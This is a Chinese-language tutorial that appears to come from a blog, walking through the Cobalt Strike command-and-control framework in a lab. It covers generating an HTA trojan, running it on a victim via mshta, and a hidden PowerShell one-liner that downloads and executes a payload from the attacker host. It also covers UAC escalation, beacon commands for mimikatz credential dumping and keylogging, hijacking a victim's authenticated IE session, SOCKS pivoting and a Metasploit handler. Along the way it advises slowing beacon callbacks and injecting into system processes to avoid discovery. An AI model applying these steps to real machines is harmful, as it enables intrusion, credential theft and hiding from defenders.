<h1 id="四、基本流程"><a href="#四、基本流程" class="headerlink" title="四、基本流程"></a>四、基本流程</h1><h2 id="1、创建监听器"><a href="#1、创建监听器" class="headerlink" title="1、创建监听器"></a>1、创建监听器</h2><p>点击Cobalt Strike -&gt; Listeners-&gt;Add，其中内置了8个Listener</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[+] Beacon DNS</span><br><span class="line">[+] Beacon HTTP</span><br><span class="line">[+] Beacon HTTPS</span><br><span class="line">[+] Beacon SMB</span><br><span class="line">[+] Beacon TCP</span><br><span class="line">[+] External C2</span><br><span class="line">[+] Foreign HTTP</span><br><span class="line">[+] Foreign HTTPS</span><br></pre></td></tr></table></figure>

<p>其中 Beacon_xx  为内置监听器，包括DNS、HTTP、HTTPS、SMB、TCP五种方式的监听器；Foreign系列为外部监听器，通常与Metasploit或者Armitage联动。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644990267324-3fd540ef-b0fa-4b37-8c16-3e8eb4242370.png" alt="img"></p>
<p>Name任意，选择所需的payload，Host为本机IP，port为没有被占用的任意端口<br>点击save即创建成功</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644991473894-ef92c13d-adc7-4eec-8336-0256ee5bdba8.png" alt="img"></p>
<h2 id="2、生成木马"><a href="#2、生成木马" class="headerlink" title="2、生成木马"></a>2、生成木马</h2><p>这里选择其中一种攻击方式作示范，后面再做详细解释：</p>
<p>点击Attacks-&gt;Packages-&gt;HTML Application，选择对应的监听器，方法这里有三种(executable/VBA/powershell)，选择powershell，点击Generate生成，选择生成的路径及文件名保存即可。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644991617904-a8c176f5-097a-4c41-aa65-42fbd6ecb7c1.png" alt="img"><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636278022327-12fc5d9d-9b0f-4042-bfce-b68f76fc9837.png" alt="img"></p>
<h2 id="3、开启Web服务"><a href="#3、开启Web服务" class="headerlink" title="3、开启Web服务"></a>3、开启Web服务</h2><p>点击Attacks-&gt;Web Drive-by-&gt;Host File，选择刚刚生成的木马evil.hta，点击Launch生成下载链接</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644991749714-208ca344-4670-42d2-87b4-a957945d0747.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644991764607-85eff98d-c82e-47a0-b487-ef80665d7181.png" alt="img"></p>
<h2 id="4、运行木马"><a href="#4、运行木马" class="headerlink" title="4、运行木马"></a>4、运行木马</h2><p>打开受害机cmd，运行<code>mshta</code>命令。mshta.exe是微软Windows操作系统相关程序，用于执行<code>.HTA</code>文件。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mshta http://<span class="number">192.168</span>.<span class="number">100.117</span>:<span class="number">8080</span>/download/file.ext</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644992318260-30994908-2949-467d-a4f3-633d75ecd0f4.png" alt="img"></p>
<p>返回CS即可看到肉鸡上线</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644992338629-d748913e-22e4-474a-baf4-dee0cdb90f62.png" alt="img"></p>
<p>选中受害机右击，选择interact，即可进行交互，由于受害机默认60秒进行一次回传，为了实验效果我们这里把时间设置成5，但实际中频率不宜过快，容易被发现。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644992496226-c591a3fd-9519-4ded-8de0-dcc13a8e8a8d.png" alt="img"></p>
<p>或者在这里更改心跳时间</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644994692740-c9c439fa-1cbb-497f-aa12-d05b32161b64.png" alt="img"></p>
<p>备注：beacon的命令执行功能较少用起来不方便，可以使用Ladon脚本。</p>
<p>Ladon脚本下载地址：<a href="https://github.com/k8gege/Ladon">https://github.com/k8gege/Ladon</a></p>
<p>Ladon具体使用方法：<a href="https://github.com/k8gege/Aggressor">https://github.com/k8gege/Aggressor</a></p>
<p>这里再顺嘴提一句另外的生成和利用木马方法：Attacks——Web Driver-by——Scripted Web Delivery（S）</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644992707356-5f6dd443-83db-49ca-9a58-51bd720fe6c8.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644992785849-977addc1-0e84-4097-83d0-1fee8946a8aa.png" alt="img"></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell.exe <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-c</span> <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.100.117:80/a&#x27;))&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644993061183-e9d24ccd-b610-4627-8e1b-35dda51b3cee.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644993127452-f3ff2828-dca0-4fae-94bf-911665b4e86f.png" alt="img"></p>
<h2 id="5、提权"><a href="#5、提权" class="headerlink" title="5、提权"></a>5、提权</h2><p>如果使用的是其他payload比如 Windows Executable，那么可以提权</p>
<p>往监听器生成exe木马</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644996167309-416bff4a-c750-40ec-b73e-b6a892850278.png" alt="img"></p>
<p>靶机启动exe</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644999387684-e1f8525d-1f9b-4148-8f8b-b5b71798a229.png" alt="img"></p>
<p>成功上线</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644999426524-bf6ce8c4-24c7-4bfa-87fc-94b0587a1bf7.png" alt="img"></p>
<p>在上线主机右键后，点击提权，选择uac提权。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644999508228-b6cf1242-8a49-4ef8-a59d-3c3ff40e8a3f.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644999532044-77b850f0-56d5-4496-813b-0a641a388ce7.png" alt="img"></p>
<p>成功后会出现一个新的主机。之后的操作可以在新的主机进行。但遗憾的是这里提权失败了</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644999669439-c14fb738-a183-4ac4-9ce3-e71911248747.png" alt="img"></p>
<p>尝试使用svc提权也失败…..这里就不纠结成功与否的问题了，懂得有提权这个功能即可</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644999755393-c4ae643d-969e-48bc-aba3-3db8cc5e0373.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645000203697-423937ef-52e0-43b6-8f6a-8d70e10d01c4.png" alt="img"></p>
<h2 id="6、导出报告"><a href="#6、导出报告" class="headerlink" title="6、导出报告"></a>6、导出报告</h2><p>点击Reporting-&gt;Activity Report，导出默认PDF文档</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636278452683-cdfc983e-0745-4e2b-ba10-ed96702c5f63.png" alt="img"></p>
<h1 id="五、Beacon"><a href="#五、Beacon" class="headerlink" title="五、Beacon"></a>五、Beacon</h1><p>当受害机上线以后，右击选择Interact，就可以打开Beacon Console</p>
<p>在beacon处输入help可以看到命令说明</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Beacon Commands</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">    Command                   Description</span><br><span class="line">    -------                   -----------</span><br><span class="line">    argue                     进程参数欺骗</span><br><span class="line">    blockdlls                 在子进程中阻止非Microsoft的DLLs文件</span><br><span class="line">    browserpivot              注入受害者浏览器进程</span><br><span class="line">    bypassuac                 绕过UAC</span><br><span class="line">    cancel                    取消正在进行的下载</span><br><span class="line">    <span class="built_in">cd</span>                        切换目录</span><br><span class="line">    checkin                   强制让被控端回连一次</span><br><span class="line">    clear                     清除beacon内部的任务队列</span><br><span class="line">    connect                   通过TCP连接到Beacon</span><br><span class="line">    covertvpn                 部署Covert VPN客户端</span><br><span class="line">    cp                        复制文件</span><br><span class="line">    dcsync                    从DC中提取密码哈希</span><br><span class="line">    desktop                   远程VNC</span><br><span class="line">    dllinject                 反射DLL注入进程</span><br><span class="line">    dllload                   使用LoadLibrary将DLL加载到进程中</span><br><span class="line">    download                  下载文件</span><br><span class="line">    downloads                 列出正在进行的文件下载</span><br><span class="line">    drives                    列出目标盘符</span><br><span class="line">    elevate                   尝试提权</span><br><span class="line">    execute                   在目标上执行程序(无输出) （执行execute notepad后，用户只能在任务管理器等后台查看到进程）</span><br><span class="line">    execute-assembly          在目标上内存中执行本地.NET程序</span><br><span class="line">    <span class="built_in">exit</span>                      退出beacon</span><br><span class="line">    getprivs                  对当前令牌启用系统权限</span><br><span class="line">    getsystem                 尝试获取SYSTEM权限</span><br><span class="line">    getuid                    获取用户ID</span><br><span class="line">    hashdump                  转储密码哈希值</span><br><span class="line">    <span class="built_in">help</span>                      帮助</span><br><span class="line">    inject                    在特定进程中生成会话（如果木马依然在内存中运行，那么用户尝试删除时会发现运行中无法删除导致引起疑心，因此获取shell后最好把木马注入到(系统)进程）</span><br><span class="line">    jobkill                   杀死一个后台任务</span><br><span class="line">    <span class="built_in">jobs</span>                      列出后台任务</span><br><span class="line">    kerberos_ccache_use       从ccache文件中导入票据应用于此会话</span><br><span class="line">    kerberos_ticket_purge     清除当前会话的票据</span><br><span class="line">    kerberos_ticket_use       从ticket文件中导入票据应用于此会话</span><br><span class="line">    keylogger                 键盘记录</span><br><span class="line">    <span class="built_in">kill</span>                      结束进程</span><br><span class="line">    link                      通过命名管道连接到Beacon</span><br><span class="line">    logonpasswords            使用mimikatz转储凭据和哈希值</span><br><span class="line">    ls                        列出文件</span><br><span class="line">    make_token                创建令牌以传递凭据</span><br><span class="line">    mimikatz                  运行mimikatz</span><br><span class="line">    mkdir                     创建一个目录</span><br><span class="line">    mode dns                  使用DNS A作为通信通道(仅限DNS beacon)</span><br><span class="line">    mode dns-txt              使用DNS TXT作为通信通道(仅限D beacon)</span><br><span class="line">    mode dns6                 使用DNS AAAA作为通信通道(仅限DNS beacon)</span><br><span class="line">    mode http                 使用HTTP作为通信通道</span><br><span class="line">    mv                        移动文件</span><br><span class="line">    net                       net命令</span><br><span class="line">    note                      给当前目标机器备注       </span><br><span class="line">    portscan                  进行端口扫描</span><br><span class="line">    powerpick                 通过Unmanaged PowerShell执行命令</span><br><span class="line">    powershell                通过powershell.exe执行命令</span><br><span class="line">    powershell-import         导入powershell脚本</span><br><span class="line">    ppid                      为生成的post-ex任务设置父PID</span><br><span class="line">    ps                        显示进程列表</span><br><span class="line">    psexec                    使用服务在主机上生成会话</span><br><span class="line">    psexec_psh                使用PowerShell在主机上生成会话</span><br><span class="line">    psinject                  在特定进程中执行PowerShell命令</span><br><span class="line">    pth                       使用Mimikatz进行传递哈希</span><br><span class="line">    <span class="built_in">pwd</span>                       当前目录位置</span><br><span class="line">    reg                       查询注册表</span><br><span class="line">    rev2self                  恢复原始令牌</span><br><span class="line">    rm                        删除文件或文件夹</span><br><span class="line">    rportfwd                  端口转发</span><br><span class="line">    run                       在目标上执行程序(返回输出)</span><br><span class="line">    runas                     以另一个用户权限执行程序</span><br><span class="line">    runasadmin                在高权限下执行程序</span><br><span class="line">    runu                      在另一个PID下执行程序</span><br><span class="line">    screenshot                屏幕截图</span><br><span class="line">    setenv                    设置环境变量</span><br><span class="line">    shell                     cmd执行命令</span><br><span class="line">    shinject                  将shellcode注入进程</span><br><span class="line">    shspawn                   生成进程并将shellcode注入其中</span><br><span class="line">    sleep                     设置睡眠延迟时间</span><br><span class="line">    socks                     启动SOCKS4代理</span><br><span class="line">    socks stop                停止SOCKS4</span><br><span class="line">    spawn                     生成一个会话 </span><br><span class="line">    spawnas                   以其他用户身份生成会话</span><br><span class="line">    spawnto                   将可执行程序注入进程</span><br><span class="line">    spawnu                    在另一个PID下生成会话</span><br><span class="line">    ssh                       使用ssh连接远程主机</span><br><span class="line">    ssh-key                   使用密钥连接远程主机</span><br><span class="line">    steal_token               从进程中窃取令牌</span><br><span class="line">    timestomp                 将一个文件时间戳应用到另一个文件</span><br><span class="line">    unlink                    断开与Beacon的连接</span><br><span class="line">    upload                    上传文件</span><br><span class="line">    wdigest                   使用mimikatz转储明文凭据</span><br><span class="line">    winrm                     使用WinRM在主机上生成会话</span><br><span class="line">    wmi                       使用WMI在主机上生成会话</span><br></pre></td></tr></table></figure>

<p>可用<code>help+命令</code>的方式查看具体命令参数说明</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">beacon&gt; <span class="built_in">help</span> argue</span><br><span class="line">Use: argue [<span class="built_in">command</span>] [fake arguments]</span><br><span class="line">     argue [<span class="built_in">command</span>]</span><br><span class="line">     argue</span><br><span class="line"></span><br><span class="line">Spoof [fake arguments] <span class="keyword">for</span> [<span class="built_in">command</span>] processes launched by Beacon.</span><br><span class="line">This option does not affect runu/spawnu, runas/spawnas, or post-ex <span class="built_in">jobs</span>.</span><br><span class="line"></span><br><span class="line">Use argue [<span class="built_in">command</span>] to <span class="built_in">disable</span> this feature <span class="keyword">for</span> the specified <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">Use argue by itself to list programs with defined spoofed arguments.</span><br></pre></td></tr></table></figure>

<p>之前说过CS与受害机默认60s进行一次交互，为了方便实验我们可以把时间设置为0</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">beacon&gt;sleep 0</span><br></pre></td></tr></table></figure>

<p>获取到Beacon后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Interact   打开beacon</span><br><span class="line">Access</span><br><span class="line">      dumphashes 获取hash</span><br><span class="line">      Elevate 提权</span><br><span class="line">      GoldenTicket 生成黄金票据注入当前会话</span><br><span class="line">      MAketoken  凭证转换</span><br><span class="line">      RunMimikatz 运行Mimikatz</span><br><span class="line">      SpawnAs 用其他用户生成CobaltStrike侦听器</span><br><span class="line">Explore</span><br><span class="line">       BrowserPivot 劫持目标浏览器进程</span><br><span class="line">       Desktop(VNC)  桌面交互</span><br><span class="line">       FileBrowser  文件浏览器</span><br><span class="line">       NetView 命令Net View</span><br><span class="line">       Portscan 端口扫描</span><br><span class="line">       Processlist 进程列表</span><br><span class="line">       Screenshot截图</span><br><span class="line">Pivoting</span><br><span class="line">       SOCKSServer 代理服务</span><br><span class="line">       Listener  反向端口转发</span><br><span class="line">       DeployVPN 部署VPN</span><br><span class="line">Spawn </span><br><span class="line">       新的通讯模式并生成会话</span><br><span class="line">Session   会话管理</span><br><span class="line">       备注，删除，心跳时间，退出</span><br></pre></td></tr></table></figure>

<p>下面我就介绍一下几个常用的命令</p>
<h2 id="1、browserpivot"><a href="#1、browserpivot" class="headerlink" title="1、browserpivot"></a>1、browserpivot</h2><p>Browser Pivot是一个针对IE浏览器的技术，利用的是IE的cookie机制，Cobalt Strike通过IE注入进程以继承用户的已验证Web会话，达到无需验证登录用户访问的网站。</p>
<p>假设受害者在通过IE浏览器登录了网站后台  </p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636278752027-95c0758b-8aef-44f3-aa4a-31121d1620bd.png" alt="img"></p>
<p>我们可以通过ps找到浏览器进程，然后通过命令进行注入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">beacon&gt; browserpivot 2600 x86</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636278814655-81452a60-4c75-4f72-bd8d-850d96b2c87e.png" alt="img"></p>
<p>这里之所以选择PID 2600是因为我们需要插入Internet Explorer以继承用户的已验证Web会话。IE的新版本会为每个选项卡生成一个进程，我们必须将其插入子选项卡以继承会话状态。通常，子选项卡共享所有会话状态。通过查看PPID值来标识IE子选项卡进程，当PPID引用explorer.exe时，该进程不是子选项卡；当PPID引用iexplore.exe时，该进程就是子选项卡。</p>
<p>当然这里也可以通过图形界面注入，右击选中Explore-&gt;Browser Pivot</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636278951468-a025f73a-8ccc-4226-bc40-dd52f4a25f98.png" alt="img"></p>
<p>然后浏览器设置代理为黑客主机即本机</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636279036118-4e09ba42-1709-4017-83a3-903a68e7771e.png" alt="img"></p>
<p>然后访问受害者所访问的网页，发现无需登录直接进入后台</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636279023475-b652596d-9a9e-4d94-a241-e74bf9f51033.png" alt="img"></p>
<h2 id="2、Socks代理"><a href="#2、Socks代理" class="headerlink" title="2、Socks代理"></a>2、Socks代理</h2><p>开启socks4a代理，通过代理进行内网渗透</p>
<p>开启socks，可以通过命令，也可以通过右键Pivoting-&gt;SOCKS Server</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">beacon&gt; socks 2222</span><br><span class="line">[+] started SOCKS4a server on: 2222</span><br><span class="line">[+] host called home, sent: 16 bytes</span><br></pre></td></tr></table></figure>

<p>然后<code>vim /etc/proxychains.conf</code>，在文件末尾添加socks4代理服务器</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636279100066-e3d17232-e04f-448b-921f-981a1286cbb8.png" alt="img"></p>
<p>使用proxychains代理扫描内网主机</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains nmap -sP 192.168.183.0/24</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636279141555-49a0e828-61e7-4e76-ab60-ec2ab73c41aa.png" alt="img"></p>
<p>我们还可以通过隧道将整个msf带进目标内网</p>
<p>点击View-&gt;Proxy Pivots，选择Socks4a Proxy，点击Tunnel：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636279185828-f4f24d45-f172-481f-ae0f-b4b5e7571d6b.png" alt="img"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">setg Proxies socks4:192.168.183.147:2222</span><br></pre></td></tr></table></figure>

<p>打开msf对内网进行扫描</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636279222963-3f0ab893-41f2-4080-9272-a16acbf01d7a.png" alt="img"></p>
<p>关闭socks</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">beacon&gt;socks stop</span><br></pre></td></tr></table></figure>

<h2 id="3、powershell-import"><a href="#3、powershell-import" class="headerlink" title="3、powershell-import"></a>3、powershell-import</h2><p>这个功能在后渗透测试中很有用，可以导入各种powershell渗透框架，如<a href="https://github.com/samratashok/nishang">Nishang</a>、<a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/">PowerSploit</a>攻击框架</p>
<p>在beacon shell输入powershell-import，导入已有的ps文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">beacon&gt; powershell-import</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636279292369-35d13cec-3952-40fd-a336-e17dfec4d4cf.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636279327323-e0b702ad-6360-4d0e-98bd-72c70063c9db.png" alt="img"></p>
<p>关于具体有哪些命令可以操作可以查看一下相应ps文件</p>
<h1 id="六、附录"><a href="#六、附录" class="headerlink" title="六、附录"></a>六、附录</h1><p>爆破cobalt strike密码脚本：<a href="https://github.com/ryanohoro/csbruter">https://github.com/ryanohoro/csbruter</a></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636279394478-5b2e3d5d-cb94-4a53-9387-142946968b9c.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636279385238-8dca4ddc-d1c2-4d79-8238-4455b7be14e8.png" alt="img"></p>
<h1 id="七、与MSF联动"><a href="#七、与MSF联动" class="headerlink" title="七、与MSF联动"></a>七、与MSF联动</h1><p>Kali IP：172.16.20.18</p>
<p>受害者机器：172.16.20.20</p>
<p>CS：172.16.20.19</p>
<h3 id="1、在MSF中创建监听器"><a href="#1、在MSF中创建监听器" class="headerlink" title="1、在MSF中创建监听器"></a>1、在MSF中创建监听器</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_http</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_http</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 172.16.20.18</span><br><span class="line">lhost =&gt; 172.16.20.18</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> lport 3333</span><br><span class="line">lport =&gt; 3333</span><br><span class="line">msf5 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636281139408-7cba4298-67ca-4a3c-8575-384f6e6451a3.png" alt="img"></p>
<p>注：监听器监听kali自身地址。</p>
<h3 id="2、在CS中设置新的监听地址"><a href="#2、在CS中设置新的监听地址" class="headerlink" title="2、在CS中设置新的监听地址"></a>2、在CS中设置新的监听地址</h3><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636279929729-c1f9e277-f40d-495a-8fdc-b23042499a81.png" alt="img"></p>
<p>注意：payload要与msf中的payload要一致。</p>
<p>在控制中右键–增加会话，选择msf的会话。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636280011856-719c4b94-f8ab-42c4-9ea1-a30901b42ff4.png" alt="img"></p>
<p>此时拿到meterpreter。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636281160088-4a71ea19-4ccf-42fb-9fa3-1d854c79da17.png" alt="img"></p>
<p>输入shell，进入主机命令操作。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636281199848-c2984472-d7e8-4447-a2ee-506020e771b1.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636281218696-07c55f31-6b96-4d90-bd1e-0d1d9e28f490.png" alt="img"></p>
<h1 id="八、Aggressor-Script"><a href="#八、Aggressor-Script" class="headerlink" title="八、Aggressor Script"></a>八、Aggressor Script</h1><h2 id="1、Sleep环境的搭建"><a href="#1、Sleep环境的搭建" class="headerlink" title="1、Sleep环境的搭建"></a>1、Sleep环境的搭建</h2><p>Aggressor Script：是C2 3.0以上版本的一个内置的脚本语言，他是由Sleep脚本解析，Sleep脚本目前国内是没有中文版本的，可能是因为使用的人不多</p>
<p>Sleep语言下载地址：<a href="http://sleep.dashnine.org/download/sleep.jar">http://sleep.dashnine.org/download/sleep.jar</a></p>
<p>快速使用：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar sleep.jar</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645023884055-4e37a027-4d05-4da6-a303-ad6f27e20a51.png" alt="img"></p>
<p>输出hello world：新建一个cna文件，cna是Aggressor Scrip脚本的后缀，然后在里面写：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">println(<span class="string">&quot;hello word&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>然后加载一下</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645026666779-2aad8305-bb07-4fc2-a9c3-ed3b52b2c667.png" alt="img"></p>
<h2 id="2、简介"><a href="#2、简介" class="headerlink" title="2、简介"></a>2、简介</h2><p>在 C2 中，我们可以打开 Aggressor Script的控制台</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645027083954-3345d986-3bd4-440d-88c9-f431b2979f2b.png" alt="img"></p>
<p>这里我们可以使用 help查看一些帮助信息：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645027115541-153b2efc-bf59-4db5-aaf9-94fbf10f926b.png" alt="img"></p>
<p>下面是介绍：</p>
<h3 id="（1）？"><a href="#（1）？" class="headerlink" title="（1）？"></a>（1）？</h3><p>？进行一个简单的判断，返回值为True或者False，例如 <code>? int(1) == int(2)</code> 返回为False</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645027229763-1c78a3d9-f8b3-42ec-8201-ae532834010c.png" alt="img"></p>
<h3 id="（2）e"><a href="#（2）e" class="headerlink" title="（2）e"></a>（2）e</h3><p>e 执行我们写的代码，相当于交互模式，如果不加上 <code>e</code> 的话是无法执行的，例如<code> e println(&quot;hello world&quot;)</code>：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645027322238-5491815f-1d41-4e5e-90b8-77b982339cb7.png" alt="img"></p>
<h3 id="（3）help"><a href="#（3）help" class="headerlink" title="（3）help"></a>（3）help</h3><p>这个就是显示帮助信息，我们在开头使用过</p>
<h3 id="（4）load"><a href="#（4）load" class="headerlink" title="（4）load"></a>（4）load</h3><p>load加载cna脚本，这里我加载一个脚本：<code>load &lt;cna path&gt;</code></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645027586674-7811cc9d-7d69-4736-8cd1-7daa30c58975.png" alt="img"></p>
<p>这里加载的 cna 内容为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">command w&#123;</span><br><span class="line">	println(<span class="string">&quot;hello world!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>意思是创建一个 command 名字为 w，当输入w的时候就打印hello word。</p>
<h3 id="（5）ls"><a href="#（5）ls" class="headerlink" title="（5）ls"></a>（5）ls</h3><p>显示我们目前加载的cna代码</p>
<h3 id="（6）proff"><a href="#（6）proff" class="headerlink" title="（6）proff"></a>（6）proff</h3><p>禁止cna脚本运行Sleep的语法（不明白具体的作用）</p>
<h3 id="（7）profile"><a href="#（7）profile" class="headerlink" title="（7）profile"></a>（7）profile</h3><p>统计cna脚本使用了哪些Sleep语法</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645027862972-e7162504-fae9-49cb-ac5b-3d79641237e8.png" alt="img"></p>
<h3 id="（8）pron"><a href="#（8）pron" class="headerlink" title="（8）pron"></a>（8）pron</h3><p>运行cna脚本运行Sleep的语法</p>
<h3 id="（9）reload"><a href="#（9）reload" class="headerlink" title="（9）reload"></a>（9）reload</h3><p>重新加载cna脚本，还是用我刚刚的cna脚本举例，我先修改cna中的内容</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">command w&#123;</span><br><span class="line">	println(<span class="string">&quot;hello friend!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再到控制台输出一下</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645027976257-54ef3ca2-36c4-44b8-8810-80ec8c07c1ca.png" alt="img"></p>
<p>没有改变，我再重载一下再运行</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645028013183-78a0902b-8602-4c09-9894-d13a0d4929a3.png" alt="img"></p>
<h3 id="（10）troff"><a href="#（10）troff" class="headerlink" title="（10）troff"></a>（10）troff</h3><p>关闭函数跟踪，也就是我们不显示函数运行的具体情况</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645028095118-8ae92239-4472-47ea-8ce7-a19db16770d7.png" alt="img"></p>
<h3 id="（11）tron"><a href="#（11）tron" class="headerlink" title="（11）tron"></a>（11）tron</h3><p>开启函数跟踪，显示我们运行时的具体情况</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645028141985-3eff0147-4458-41f3-85ce-d38b8aeb4afe.png" alt="img"></p>
<p>发现我们运行的情况，在t1.cna的第二行，我们输出hello friend</p>
<h3 id="（12）x"><a href="#（12）x" class="headerlink" title="（12）x"></a>（12）x</h3><p>执行一个计算，比如1 + 1什么的，这里需要注意，两个数字之间需要间隔开，不然会报错</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645028221816-3561ebe9-4430-4661-80d6-9d93c6867fcc.png" alt="img"></p>
<h2 id="3、使用不带GUI的C2"><a href="#3、使用不带GUI的C2" class="headerlink" title="3、使用不带GUI的C2"></a>3、使用不带GUI的C2</h2><p>我们可以使用agscript 运行一个不使用GUI的C2客户端，简单来说就是命令行的操作</p>
<p>服务器上启动后，在本地输入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./agscript [host] [port] [user] [password]</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645028490112-c6de7f09-a05c-4b21-9630-f3544096b317.png" alt="img"></p>
<h2 id="4、Sleep快速入门"><a href="#4、Sleep快速入门" class="headerlink" title="4、Sleep快速入门"></a>4、Sleep快速入门</h2><p>这是他的数据类型，首先我们要注意的是，他的格式是一定需要带上空格的。</p>
